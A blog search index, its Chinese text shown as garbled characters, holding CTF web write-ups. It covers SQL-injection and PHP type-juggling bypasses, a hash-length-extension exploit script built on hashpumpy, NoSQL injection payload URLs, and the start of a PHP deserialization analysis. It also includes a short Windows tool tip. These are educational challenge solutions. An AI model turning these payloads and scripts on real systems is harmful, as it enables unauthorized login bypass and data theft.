<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ÂÆûÈ™åÂêßweb]]></title>
    <url>%2F2019%2F08%2F06%2F%E5%AE%9E%E9%AA%8C%E5%90%A7web%2F</url>
    <content type="text"><![CDATA[ËÆ∞ÂΩï‰∏Ä‰∏ãÂÆûÈ™åÂêßÁöÑwp ÂêéÂè∞ÁôªÈôÜ ctrl+uÊü•ÁúãÊ∫êÁ†Å 123456789&lt;!-- $password=$_POST['password']; $sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'"; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0)&#123; echo 'flag is :'.$flag; &#125; else&#123; echo 'ÂØÜÁ†ÅÈîôËØØ!'; &#125; --&gt; ‰∏Ä‰∏äÊù•Â∞±ÈóÆÁÆ°ÁêÜÂëòÂØÜÁ†ÅÔºåÂπ∂‰∏îË¶ÅÊ±ÇÁôªÈôÜÔºåÈÇ£‰πàÊòØÁàÜÁ†¥Âë¢ÔºåËøòÊòØÁàÜÁ†¥Âë¢Ôºü emmmmmÂÖ∂ÂÆûËøôÈ¢òÁöÑËÄÉÁÇπÊòØmd5ÁöÑ Êü•‰∫Ü‰∏Ä‰∏ãÂÆòÊñπÊñáÊ°£Ôºåmd5ÂáΩÊï∞ÁöÑÁ¨¨‰∫å‰∏™ÂèÇÊï∞Â¶ÇÊûú‰∏∫true,ÈÇ£‰πàÂ∞±‰ºöËøîÂõûÂéüÂßã16Â≠óÁ¨¶‰∫åËøõÂà∂Ê†ºÂºè ËÄå‰∏îsqlËØ≠Âè•ÊòæÁÑ∂ÊòØÂèØ‰ª•ÊãºÊé•Ê≥®ÂÖ•ÁöÑÔºåÂÖ≥ÈîÆÂú®‰∫éÂ¶Ç‰ΩïÊ≥®ÂÖ•‰∫Ü Êèê‰æõ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Ôºö ffifdyop md5ÂêéÔºå276f722736c95d99e921722cf9ed621cÂÜçËΩ¨ÊàêÂ≠óÁ¨¶‰∏≤:' ' 'or' 6&lt;trach&gt;Ëß£Êûê:Â≠òÂú® or Âç≥‰ª£Á†ÅÁöÑ‰∏§ËæπÊúâ‰∏ÄËæπ‰∏∫ÁúüÊó¢ÂèØ‰ª•ÁªïËøáÔºå&lt;trach&gt;ÂÖ∂ÂÆû‰∏∫ÂûÉÂúæ‰ª£Á†ÅÊ≤°Êúâ‰ªª‰ΩïÁî®ÁöÑ„ÄÇor ÂêéÈù¢Êúâ6ÔºåÈùûÈõ∂ÂÄºÂç≥‰∏∫Áúü„ÄÇÊó¢ÂèØ‰ª•ÊàêÂäüÁªïËøá„ÄÇ http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php ÂΩìÁÑ∂ÁúãËØÑËÆ∫‰πüÊúâËØ¥ÂØÜÁ†ÅÂ∞±ÊòØe58ÁöÑ ËÆ§Áúü‰∏ÄÁÇπ ËøôÈÅìÈ¢òÊòØÁõ≤Ê≥®ÁöÑÈ¢òÁõÆÔºå‰∏çÂ§™Â•ΩÊêû Â§©‰∏ãÊ≠¶ÂäüÂîØÂø´‰∏çÁ†¥ Ëøô‰∏™ÂèØ‰ª•ÈÄöËøáÊµèËßàÂô®ÊäìÂåÖÔºåÁÑ∂ÂêéÂèëÁé∞ÂìçÂ∫îÂ§¥‰∏≠Êúâ‰∏Ä‰∏™FLAGÂ≠óÊÆµÊòæÁÑ∂ÊòØbase64Âä†ÂØÜËøáÁöÑÔºåËß£ÂØÜ‰πãÂêéÂ∞±‰ºöÂæóÂà∞ÊèêÁ§∫ÔºåËÆ©‰Ω†ÂÜôËÑöÊú¨postÊèê‰∫§ ÊàëÂÜôÁöÑÂûÉÂúæ‰ª£Á†ÅÂ¶Ç‰∏ãÔºö 1234567891011121314151617import urllibimport base64import requestsres = urllib.urlopen("http://ctf5.shiyanbar.com/web/10/10.php")head = str(res.headers)FLAG = head[head.index('FLAG')+6:head.index('FLAG')+48+6]flagBase64 = base64.decodestring(FLAG)TrueFlag = flagBase64[flagBase64.index(':')+1:]data = &#123;'key': TrueFlag&#125;res = requests.post(url='http://ctf5.shiyanbar.com/web/10/10.php', data=data)print res.content Â∏àÂÇÖÂÜôÁöÑ‰ª£Á†ÅÊØîÊàëÂ•ΩÁúãÂ§ö‰∫Ü 12345678910111213# coding:utf8import requestsimport base64url = "http://ctf4.shiyanbar.com/web/10.php" # ÁõÆÊ†áURLs = requests.Session() # Ëé∑Âèñ Sessionresponse = s.get(url) # ÊâìÂºÄÈìæÊé•head = response.headers # Ëé∑ÂèñÂìçÂ∫îÂ§¥flag = base64.b64decode(head['flag']).split(':')[1] # Ëé∑ÂèñÁõ∏Â∫îÂ§¥‰∏≠ÁöÑFlagprint flag # ÊâìÂç∞FlagpostData = &#123;'key': flag&#125; # ÊûÑÈÄ†PostËØ∑Ê±Ç‰Ωìresult = s.post(url=url, data=postData) # Âà©Áî®PostÊñπÂºèÂèëÈÄÅËØ∑Ê±Ç# (Ê≥®ÊÑèË¶ÅÂú®Âêå‰∏Ä‰∏™Session‰∏≠ , ÊúâÁöÑÊó∂ÂÄôËøòÈúÄË¶ÅËÆæÁΩÆCookies , ‰ΩÜÊòØÊ≠§È¢ò‰∏çÈúÄË¶Å)print result.text # ÊâìÂç∞ÂìçÂ∫îÂÜÖÂÆπ ÊãêÂºØÊäπËßí Ëøô‰∏™Ê∂âÂèäÂà∞ÊàëÁöÑÁü•ËØÜÁõ≤Âå∫ÔºåÂè´ÂÅö‰º™ÈùôÊÄÅÈ°µÈù¢ ÁôæÂ∫¶ÁôæÁßë payload http://ctf5.shiyanbar.com/indirection/index.php/a/index.php Forms ‰Ωú‰∏∫ÁΩëÁªúÂÆâÂÖ®ÁöÑ‰∫∫ÊâçÔºå‰∏ÄÂÆöË¶Å‰ªîÁªÜËßÇÂØüÊØè‰∏ÄÂ§ÑÂú∞Êñπ ÊØîÂ¶ÇËøô‰∏™È¢òÁõÆÁöÑË°®ÂçïÔºö 12345&lt;form action="" method="post"&gt; PIN:&lt;br&gt; &lt;input type="password" name="PIN" value=""&gt; &lt;input type="hidden" name="showsource" value=0&gt; &lt;button type="submit"&gt;Enter&lt;/button&gt; ÂæàÊòéÊòæÁúãÂà∞ÔºåÊúâ‰∏Ä‰∏™hiddenÂ≠óÊÆµÔºåËÄå‰∏îÊòØshowsource,Â¶ÇÊûúÂ∞ÜÂÖ∂‰øÆÊîπ‰∏∫1Â∞±ËÉΩÂæóÂà∞Ê∫êÁ†Å Ê∫êÁ†ÅÂ¶Ç‰∏ãÔºö 12345678&lt;?php$a = $_POST["PIN"];if ($a == -19827747736161128312837161661727773716166727272616149001823847) &#123; echo "Congratulations! The flag is $flag";&#125; else &#123; echo "User with provided PIN not found.";&#125;?&gt; emmmmÂêéÈù¢Â∞±‰∏çËØ¥‰∫Ü Â§©ÁΩëÁÆ°ÁêÜÁ≥ªÁªü Êü•ÁúãÊ∫êÁ†ÅÊúâÈöêËóèÂ≠óÊÆµ 1&lt;!-- $test=$_GET['username']; $test=md5($test); if($test=='0') --&gt; ËÅîÊÉ≥Âà∞php‰ª£Á†ÅÂÆ°ËÆ°ÁöÑÂ∞ètrick md5(QNKCDZO)ÂæóÂà∞ÁöÑÁªìÊûúÊòØ0eÂºÄÂ§¥ÁöÑ ÂæóÂà∞ÊèêÁ§∫Ôºå ËÆøÈóÆhttp://ctf5.shiyanbar.com/10/web1/user.php?fame=hjkleffifer ÂæóÂà∞Ôºö 1$unserialize_str = $_POST[&apos;password&apos;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&apos;user&apos;] == &apos;???&apos; &amp;&amp; $data_unserialize[&apos;pass&apos;]==&apos;???&apos;) &#123; print_r($flag); &#125; ‰ºüÂ§ßÁöÑÁßëÂ≠¶ÂÆ∂phpÊñπË®ÄÈÅìÔºöÊàê‰πüÂ∏ÉÂ∞îÔºåË¥•‰πüÂ∏ÉÂ∞î„ÄÇ ÂõûÂéªÂêßÈ™öÂπ¥ Â§©ÁúüÁöÑÊàë‰ª•‰∏∫ÈÇ£‰∏â‰∏™ÈóÆÂè∑Â∞±ÊòØÁúüÁöÑÈóÆÂè∑ Âîâ„ÄÇ„ÄÇ 12345678&lt;?php$a = array('user'=&gt;true, 'pass'=&gt;true);$b = serialize($a);$c = unserialize($b);var_dump($b);?&gt; Â∞ÜËøô‰∏™‰Ωú‰∏∫passwordËæìÂÖ•a:2:{s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;} ÂøòËÆ∞ÂØÜÁ†Å Ëøô‰∏™È¢òÁõÆÊúâÁÇπÈöæÂ∫¶ ‰∏çËøáËøòÊòØË¶ÅËé∑Âèñ‰ø°ÊÅØ Êü•ÁúãÊ∫ê‰ª£Á†ÅÂèëÁé∞‰∏§Â§ÑÂÖ≥ÈîÆ‰ø°ÊÅØÔºö 12&lt;meta name="admin" content="admin@simplexue.com" /&gt;&lt;meta name="editor" content="Vim" /&gt; ÂëäËØâ‰∫Ü‰Ω†ÁÆ°ÁêÜÂëòÁöÑÈÇÆÁÆ±Âíåvim„ÄÇ„ÄÇÂëäËØâÊàëvimÂπ≤ÂòõÔºüÂΩìÁÑ∂ÊòØswpÊñá‰ª∂‰∫Ü Ê≠§Â§ÑËÆøÈóÆhttp://ctf5.shiyanbar.com/10/upload/.submit.php.swpÂèØ‰ª•ÂæóÂà∞swpÊñá‰ª∂ (ËøôÊòØÈÄöËøáÊäìÂåÖÁü•ÈÅìÂèëÁé∞Ë°®Âçï‰∏ä‰º†ÁöÑÂ∞±ÊòØËøô‰∏™Êñá‰ª∂ÔºåÂ§öËØïÂá†Ê¨°ÔºåËÆ∞ÂæóÂú®Êñá‰ª∂ÂêçÂâçÂä†*.*) 12345678910111213141516171819202122232425262728293031323334353637383940414243........Ëøô‰∏ÄË°åÊòØÁúÅÁï•ÁöÑ‰ª£Á†Å......../*Â¶ÇÊûúÁôªÂΩïÈÇÆÁÆ±Âú∞ÂùÄ‰∏çÊòØÁÆ°ÁêÜÂëòÂàô die()Êï∞ÊçÆÂ∫ìÁªìÊûÑ---- Ë°®ÁöÑÁªìÊûÑ `user`--CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT '0', PRIMARY KEY (`id`)) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;---- ËΩ¨Â≠òË°®‰∏≠ÁöÑÊï∞ÊçÆ `user`--INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES(1, '****‰∏çÂèØËßÅ***', '***‰∏çÂèØËßÅ***', 0);*/........Ëøô‰∏ÄË°åÊòØÁúÅÁï•ÁöÑ‰ª£Á†Å........if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo "Â§±Ë¥•‰∫ÜÂëÄ"; &#125;&#125; tokenÊòØ0e00000000Âç≥ÂèØÁªïËøá payloadÂ¶Ç‰∏ãÔºö http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin%40simplexue.com&amp;token=0e00000000]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>web</tag>
        <tag>ÂÆûÈ™åÂêß</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windowsËµÑÊ∫êÁÆ°ÁêÜÂô®Á•ûÂô®]]></title>
    <url>%2F2019%2F08%2F05%2Fwindows%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E7%A5%9E%E5%99%A8%2F</url>
    <content type="text"><![CDATA[‰∏ÄÁõ¥ÂæàÂõ∞ÊÉë‰∏çÁü•ÈÅìÂ¶Ç‰Ωï‰ΩøÁî®ËµÑÊ∫êÁÆ°ÁêÜÂô®ÔºåÊØèÊ¨°Â§çÂà∂Á≤òË¥¥Êñá‰ª∂ÈÉΩÈúÄË¶ÅÂêåÊó∂ÊâìÂºÄÂ§ö‰∏™ËµÑÊ∫êÁÆ°ÁêÜÂô®ÁÑ∂ÂêéÂÜçemmmmÔºåÁÑ∂ÂêéÂ∞±‰ºöÂ´åËµÑÊ∫êÁÆ°ÁêÜÂô®Â§™Â§ö‰∫ÜÂ∞±Êó†ËÑëxÊéâ‰∫ÜÔºåËøôÊó∂ÂÄôÂ∞±‰ºöÂèëÁé∞mmpÊàëÂàöÊâìÂºÄÁöÑËµÑÊ∫êÁÆ°ÁêÜÂô®Âë¢„ÄÇ„ÄÇ„ÄÇÁÑ∂ÂêéÂèàË¶ÅÂéªÊâæemmmm ‰∫éÊòØÂéªÊêú‰∫Ü‰∏Ä‰∏ãÁî®Êù•Â¢ûÂº∫ËµÑÊ∫êÁÆ°ÁêÜÂô®ÁöÑÂ∑•ÂÖ∑ÊâæÂà∞‰∫ÜËøô‰∏™Ôºö QTTabBar ÂèØ‰ª•ËØ¥ÊòØ‰ΩìÈ™åÂæàÊ£í‰∫Ü ÁΩëÂùÄ ÊØîÂ¶ÇÂ§öÊ†áÁ≠æÈ°µ ÂÜçÊØîÂ¶ÇÊñá‰ª∂ÂíåÊñá‰ª∂Â§πÈ¢ÑËßà ÊÄª‰πãÂæàÊ£íÂ∞±ÊòØ‰∫Ü]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>ËµÑÊ∫êÁÆ°ÁêÜÂô®</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÂàùËßÅÂìàÂ∏åÊâ©Â±ïÊîªÂáª]]></title>
    <url>%2F2019%2F08%2F05%2F%E5%88%9D%E8%A7%81%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[ÁõÆÂâçËøòÊòØÂ§™Ëèú‰∫ÜÔºåÂêëÂ∏àÂÇÖ‰ª¨Â•ΩÂ•ΩÂ≠¶‰π† SSRF me ÁÇπÂºÄÈ¶ñÈ°µÂ∞±ÊòØ‰∏ÄÈïø‰∏≤‰ª£Á†Å, curlÈáçÂÆöÂêë‰øùÂ≠òÂà∞Êñá‰ª∂‰∏≠,ÁÑ∂Âêé‰ªîÁªÜÂàÜÊûê‰∫Ü‰∏Ä‰∏ã‰ª£Á†Å Á®ãÂ∫è‰∏ªË¶ÅÊ∂âÂèäÂà∞‰∏â‰∏™ÂèÇÊï∞,‰∏Ä‰∏™ÊòØparamÂú®get‰∏≠,Âè¶Â§ñ‰∏§‰∏™actionÂíåsignÊòØÈÄöËøácookieËé∑ÂæóÁöÑ ËÆøÈóÆ/geneSignÂèØ‰ª•ÂæóÂà∞signÁöÑÂÄº, actionÂèØ‰ª•ÊòØscanÊàñread,‰ΩÜÊòØÂú®ËÆøÈóÆ/De1ctfÊó∂,‰ºöÊ£ÄÈ™åsignÊòØÂê¶Ê≠£Á°Æ,signÁöÑÁîüÊàêÁÆóÊ≥ïÔºö 12def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() ËøôÂÖ∂‰∏≠secret_keyÊòØ‰∏çÁü•ÈÅìÁöÑ,Âπ∂‰∏îgengeSignÈôêÂà∂‰∫ÜactionÂè™ËÉΩÊòØscan,ÁªìÂêàÂêéÊù•È¢òÁõÆÁöÑÊèêÁ§∫ÊòØËÆøÈóÆflag.txt,‰ΩÜÊòØÊúÄÂ§öÂ∞ÜËøô‰∏™Êñá‰ª∂ËØªÂÖ•result.txt,Âç¥‰∏çËÉΩËØªÂèñÂá∫Êù•„ÄÇ ËøôÊ†∑ÊÉ≥Êù•ÊòØ‰∏çÊòØÂè™ËÉΩÁàÜÁ†¥secret_key‰∫ÜÔºü‰ΩÜÊòØsecret_keyÂèàÊÄé‰πà‰ºöÈÇ£‰πàÂÆπÊòìÁªô‰Ω†Âë¢„ÄÇ„ÄÇ ËøôÂ∞±Ê∂âÂèäÂà∞ÊàëÁöÑÁü•ËØÜÁõ≤Âå∫‰∫Ü,Âè´ÂÅöÂìàÂ∏åÊâ©Â±ïÊîªÂáª„ÄÇ„ÄÇ ÂÖàÁúãÂÆûÈ™åÂêß‰∏ÄÈÅì‰æãÈ¢ò ËøôÈ¢òÔºåÊ≥®ÂÖ•‰∏çÊÉ≥Ê≥®ÂÖ•ÔºåÊ∫êÁ†ÅÊ≤°Êâ´Âá∫Êù•ÔºåÂï•‰ø°ÊÅØÈÉΩÊ≤°ÊúâÔºü ËøòÊòØË¶ÅÂ§öÂÖ≥Ê≥®ÊäìÂåÖÁöÑ‰ø°ÊÅØÔºåÂ∞§ÂÖ∂ÊòØÊï∞ÊçÆÂåÖ‰∏≠Âá∫Áé∞‰∫Ü‰∏Ä‰∫õ‰Ω†ÈÉΩÊ≤°ÊúâÁúãËøáÁöÑ‰∏úË•øÁöÑÊó∂ÂÄôÂ∞±Ë¶Å‰ªîÁªÜÁúã‰∏ÄÁúã‰∫Ü hhhÊ≤°ÊÉ≥Âà∞Âêß ÂéüÊù•ÂèØ‰ª•ÈÄöËøáËøôÁßçÊñπÂºèËé∑ÂèñÂà∞Ê∫ê‰ª£Á†Å„ÄÇ„ÄÇ 12345678910111213141516171819202122232425262728293031$flag = "XXXXXXXXXXXXXXXXXXXXXXX";$secret = "XXXXXXXXXXXXXXX"; // This secret is 15 characters long for security!$username = $_POST["username"];$password = $_POST["password"];if (!empty($_COOKIE["getmein"])) &#123; if (urldecode($username) === "admin" &amp;&amp; urldecode($password) != "admin") &#123; if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) &#123; echo "Congratulations! You are a registered user.\n"; die ("The flag is ". $flag); &#125; else &#123; die ("Your cookies don't match up! STOP HACKING THIS SITE."); &#125; &#125; else &#123; die ("You are not an admin! LEAVE."); &#125;&#125;setcookie("sample-hash", md5($secret . urldecode("admin" . "admin")), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE["source"])) &#123; setcookie("source", 0, time() + (60 * 60 * 24 * 7));&#125;else &#123; if ($_COOKIE["source"] != 0) &#123; echo ""; // This source code is outputted here &#125;&#125; emptyÂáΩÊï∞ ÈùûÁ©∫ËøîÂõûfalseÔºåÂà´ÊÉ≥Â§ö‰∫Ü ÂÖ≥ÈîÆÂú®ËøôÈáåÔºö if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { ÂÖ∂‰∏≠$secretÊòØ‰∏çÁü•ÈÅìÁöÑÔºå$usernameÂíåpasswordÊòØÂèØ‰ª•ÊéßÂà∂ÁöÑÔºåÂπ∂‰∏î$secretÁöÑÈïøÂ∫¶ÊòØ15 ÂìàÂ∏åÊâ©Â±ïÊîªÂáªÁöÑÂéüÁêÜ‰πãÂêéÂÜçËÆ®ËÆ∫ÔºåÊàë‰ª¨ÂÖàÂàÜÊûêËøôÈ¢òÂíãÊêû È¶ñÂÖàusernameÂøÖÈ°ªÊòØadmin,password‰∏çËÉΩÊòØadminÈÇ£Â∞±Èöè‰æøËæì‰∏Ä‰∏™ÂÄºÊØîÂ¶Çcck Êàë‰ª¨ÁöÑÁõÆÊ†áÂæàÁÆÄÂçïÔºåÂ∞±ÊòØÁªïËøáÂÆÉ if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { ÊâÄ‰ª•ÁõÆÊ†áÂ∞±ÊòØËÆ©$COOKIE[&quot;getmein&quot;]Âíåmd5ÂêéÁöÑÂÄºÁõ∏Á≠âÔºåÊâÄ‰ª•ÈúÄË¶ÅÂêåÊó∂‰º™ÈÄ†‰∏§ËæπÁöÑÂÄºÂ§©Âπ≥ÊâçËÉΩÂπ≥Ë°° ËÄåhashpumpÂ∑•ÂÖ∑Â∞±ÊòØÊù•Âπ≤Ëøô‰∏™ÁöÑÔºö Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØmd5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;))ÁöÑÂÄºÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÊòØÂ°´ÂÖÖÁöÑÊï∞ÊçÆÔºåÁ¨¨‰∏â‰∏™ÂèÇÊï∞ÊòØÂ°´ÂÖÖÊï∞ÊçÆÂä†keyÁöÑÈïøÂ∫¶ÔºåÁ¨¨Âõõ‰∏™ÂèÇÊï∞ÊòØÊ∑ªÂä†ÁöÑÊï∞ÊçÆ„ÄÇ ËøôÊ†∑Â∞±ËÉΩÂêåÊó∂ÁîüÊàêÂ§©Âπ≥Â∑¶ËæπÂíåÂè≥ËæπÁöÑÂÄº‰∫Ü ÂΩìÁÑ∂ËøòÈúÄË¶ÅURLÁºñÁ†Å‰∏Ä‰∏ã ÁêÜËß£‰∫ÜËøôÈ¢òÈÇ£‰πàËøôÈÅìDe1ctfÁöÑÈ¢òÁõÆ‰πüÂ∞±Â•ΩËØ¥‰∫Ü ÂèÇËÄÉctftime‰∏äÁöÑexp‰ª£Á†ÅÂ¶Ç‰∏ãÔºö 123456789101112131415161718192021222324252627282930import requests,hashpumpy,urllib"""hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)Arguments: hexdigest(str): Hex-encoded result of hashing key + original_data. original_data(str): Known data used to get the hash result hexdigest. data_to_add(str): Data to append key_length(int): Length of unknown data prepended to the hashReturns: A tuple containing the new hex digest and the new message.'"""payload = 'flag.txt'param = 'param=' + payloadbase_url = 'http://139.180.128.86/'signurl = base_url + 'geneSign?' + paramr = requests.post(url=signurl,cookies=&#123;'action':'scan'&#125;)sign = r.contentprint(sign)readsign,add_data = hashpumpy.hashpump(sign,payload+'scan','read',16)print(readsign)# print add_dataadd_data = add_data[len(payload):]print(add_data)expurl = base_url + 'De1ta?' + paramprint(urllib.parse.quote(add_data))r = requests.post(url=expurl,cookies=&#123;'action':urllib.parse.quote(add_data),'sign':readsign&#125;)print(r.content) ÂΩìÁÑ∂ÊàëÁî®ÁöÑÊòØpython3ÔºåÂπ∂‰∏îÊ≥®ÊÑèurllib.parse.quote(add_data)ÊñπÊ≥ï Â∞±ÊàêÂäü‰∫Ü]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>De1ctf</tag>
        <tag>hash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[noSQL Injection]]></title>
    <url>%2F2019%2F08%2F04%2FnoSQL-Injection%2F</url>
    <content type="text"><![CDATA[ËøôÈÅìÈ¢òÊòØcybricsÁöÑ‰∏ÄÈÅìwebÈ¢òÔºåÁî±‰∫éÊòØÁ¨¨‰∏ÄÊ¨°Êé•Ëß¶noSQLÊ≥®ÂÖ•ÔºåÊâÄ‰ª•ÂçïÁã¨ÊãøÂá∫Êù•Â•ΩÂ•ΩÁ†îÁ©∂‰∏Ä‰∏ã phpÊìç‰ΩúmongodbÁöÑËØ≠Ê≥ïÔºö 123456789// connect to mongodb$m = new MongoClient();// select a database$db = $m-&gt;test;// select collection$collection = $db-&gt;users;$cursor = $collection-&gt;find($data);$cursor = $collection-&gt;findone($data); Âü∫Êú¨‰∏äÂ∞±ÊòØÂÆû‰æãÂåñÂØπË±°ÔºåÈÄâÊã©Êï∞ÊçÆÂ∫ìÔºåÈÄâÊã©Ë°®ÔºåÁÑ∂ÂêéÂºÄÂßãÊü•Êâæ Êü•ËØ¢ËØ≠Ê≥ï‰∏ªË¶ÅÂ¶Ç‰∏ãÔºö 123456789db.user.find(&#123;'username': 'xxxppp'&#125;)//Êü•ÊâæÁî®Êà∑Âêç‰∏ç‰∏∫admin‰∏îpassword‰∏∫123456ÁöÑÁî®Êà∑db.user.find(&#123;'username':&#123;$ne:'admin'&#125;, 'password':'123456'&#125;)//Ê≠£ÂàôÂåπÈÖçÔºödb.customer.find(&#123;'name': &#123;'$regex':'.*s.*'&#125; &#125;)db.user.find(&#123;'username':/jrx/i&#125;) ËøôÈÅìÈ¢òÁõÆÈ¶ñÂÖàÂèØ‰ª•Áî®dirsearchÂèëÁé∞ÊòØgitÊ∫êÁ†ÅÊ≥ÑÈú≤Ôºå‰πãÂêéÁî®GitHacker.pyËé∑ÂèñÂà∞Ê∫êÁ†Å Êü•Áúãindex.phpÔºåÈ¶ñÂÖàË¶ÅÁôªÈôÜÔºåÈúÄË¶ÅÁªïËøáauthÂáΩÊï∞ 123456789function auth($username, $password) &#123; $collection = (new MongoDB\Client('mongodb://localhost:27017/'))-&gt;test-&gt;users; $raw_query = '&#123;"username": "'.$username.'", "password": "'.$password.'"&#125;'; $document = $collection-&gt;findOne(json_decode($raw_query)); if (isset($document) &amp;&amp; isset($document-&gt;password)) &#123; return true; &#125; return false;&#125; usernameÂíåpasswordÈÉΩÊ≤°ÊúâÁªèËøáËøáÊª§Â∞±ÊãºÊé•‰∫ÜÔºå‰ΩÜÊòØËøôÈáåÊúâ‰∏Ä‰∏™json_decode‰∏çÂ§™Â•ΩËøá Â¶ÇÊûúÊ≤°Êúâjson_decodeÂáΩÊï∞ÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;1&quot;}}ÁªïËøáÁôªÈôÜÁöÑÈôêÂà∂ ‰∫éÊòØËøôÊ†∑ÂÅöÔºö ËøôÊ†∑Â∞±ÁªïËøáÈôêÂà∂ÁôªÈôÜ‰∫Ü Êù•ÁúãÁ¨¨‰∫å‰∏™Ôºö 1234567891011121314151617&lt;?php $filter = $_GET['filter']; $collection = (new MongoDB\Client('mongodb://localhost:27017/'))-&gt;test-&gt;news; $pipeline = [ ['$group' =&gt; ['_id' =&gt; '$category', 'count' =&gt; ['$sum' =&gt; 1]]], ['$sort' =&gt; ['count' =&gt; -1]], ['$limit' =&gt; 5], ]; $filters = [ ['$project' =&gt; ['category' =&gt; $filter]] ]; $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));?&gt; array_mergeÂáΩÊï∞Â∞Ü$pipelineÂíåfiltersËøõË°åÂêàÂπ∂ Êü•ÊâæËµÑÊñôÂæóÁü• Âú®mongodbÁöÑaggregate‰∏≠ÔºåÂèØ‰ª•‰ΩøÁî®$condËøõË°åÊù°‰ª∂ËØ≠Âè•Ôºö Âπ∂‰∏îÔºö Êàë‰ª¨ÂèØ‰ª•ÊûÑÈÄ†Â¶Ç‰∏ãÈìæÊé•ÔºåÂåπÈÖçÂà∞flagÊó∂Â∞ÜÂÖ∂ÁßªÈô§ http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$$REMOVE&amp;filter[$cond][else]=$category Âà©Áî®Êù°‰ª∂ËØ≠Âè•ÔºåÂèëÁé∞flagsÊó∂ÔºåÂ∞±ËæìÂá∫ÂÖ∂titleÔºö http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$title&amp;filter[$cond][else]=$category ‰ªétitle‰∏≠Êàë‰ª¨ÂæóÁü•ÊúâtextÔºåÈÇ£‰πàËØªÂèñÔºö http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=$category Â∞±ÂèØ‰ª•Ëé∑Âæóflag‰∫Ü ÂèÇËÄÉ NoSQLÊ≥®ÂÖ•ÊÄªÁªì(MongoDB) 019 CyBRICS CTF Quals wp]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>cybrics</tag>
        <tag>NoSQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[qwbÂ§çÁé∞]]></title>
    <url>%2F2019%2F08%2F03%2Fqwb%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[Â§çÁé∞‰∏Ä‰∫õqwbÁöÑÈ¢òÁõÆ upload ÂèØ‰ª•ÈÄöËøádirsearchÊâæÂà∞Ê≥ÑÈú≤ÁöÑÊ∫êÁ†Å Ôºå -uÊåáÂÆöurlÔºå -eÊåáÂÆöÊèí‰ª∂ Â¶ÇÊûúÊòØ‰ª£Á†ÅÂÆ°ËÆ°È¢òÔºåËÄå‰∏îÊòØÊñá‰ª∂ÂæàÂ§öÁöÑÔºåÈúÄË¶ÅÊâæÂà∞Âà©Áî®ÁÇπÔºåÊàë‰ª¨Áõ¥Êé•ÊêúÁ¥¢unserializeÊâæÂà∞‰∏ÄÂ§ÑÂèØ‰ª•Âà©Áî®ÁöÑ‰ª£Á†ÅÔºö 123456789101112public function login_check()&#123; $profile=cookie('user'); //Ëé∑ÂèñÂà∞cookie‰∏≠ÁöÑuserÂÄº if(!empty($profile))&#123; $this-&gt;profile=unserialize(base64_decode($profile)); //Áõ¥Êé•ÂèçÂ∫èÂàóÂåñ $this-&gt;profile_db=db('user')-&gt;where("ID",intval($this-&gt;profile['ID']))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null)&#123; return 1; &#125;else&#123; return 0; &#125; &#125; &#125; Êé•‰∏ãÊù•ÂéªÂØªÊâæÂì™ÈáåË∞ÉÁî®‰∫ÜËøô‰∏™ÊñπÊ≥ïÔºåÂú®ProfileËøô‰∏™Á±ª‰∏≠ 123456789public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index"; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; ... 